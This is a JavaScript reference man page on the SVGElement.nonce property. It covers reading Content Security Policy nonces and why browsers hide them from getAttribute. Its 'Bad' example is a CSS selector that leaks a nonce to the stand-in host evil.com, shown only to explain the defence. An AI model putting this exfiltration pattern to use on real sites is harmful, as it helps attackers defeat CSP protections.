.\" Automatically generated by Pandoc 3.7.0.1
.\"
.TH "SVGELEMENT.NONCE" "3JS" "April 10, 2025" "JavaScript" "JavaScript Reference Manual"
.SH NAME
SVGElement.nonce \- SVGElement: nonce property
.SH SYNOPSIS
The \f[B]\f[CB]nonce\f[B]\f[R] property of the \f[CR]SVGElement\f[R]
interface returns the nonce that is used by Content Security Policy to
determine whether a given fetch will be allowed to proceed.
.SH VALUE
A String; the cryptographic nonce, or an empty string if no nonce is
set.
.SH EXAMPLES
.SS Retrieving a nonce value
In the past, not all browsers supported the \f[CR]nonce\f[R] IDL
attribute, so a workaround is to try to use \f[CR]getAttribute\f[R] as a
fallback:
.IP
.EX
\f[B]const\f[R] svg = document.querySelector(\(dqsvg\(dq);
\f[B]const\f[R] nonce = svg.nonce || svg.getAttribute(\(dqnonce\(dq);

\f[I]// Modern browsers hide the nonce attribute from getAttribute()\f[R]
console.log(nonce); \f[I]// Prefer using \(gasvg.nonce\(ga\f[R]
.EE
.PP
However, recent browsers version hide \f[CR]nonce\f[R] values that are
accessed this way (an empty string will be returned).
The IDL property (\f[CR]svg[\(aqnonce\(aq]\f[R]) will be the only way to
access nonces.
.PP
Nonce hiding helps prevent attackers from exfiltrating nonce data via
mechanisms that can grab data from content attributes like this CSS
selector:
.PP
\f[B]Bad\f[R]
.IP
.EX
svg[nonce\(ti=\(dqwhatever\(dq] {
  \f[B]background\f[R]: url(\(dqhttps://evil.com/nonce?whatever\(dq);
}
.EE
.SH SEE ALSO
.IP \(bu 2
\f[CR]HTMLElement.nonce\f[R] a similar method for HTML elements.
.IP \(bu 2
\f[CR]nonce\f[R] global attribute
.IP \(bu 2
Content Security Policy
.IP \(bu 2
CSP: \f[CR]script\-src\f[R]
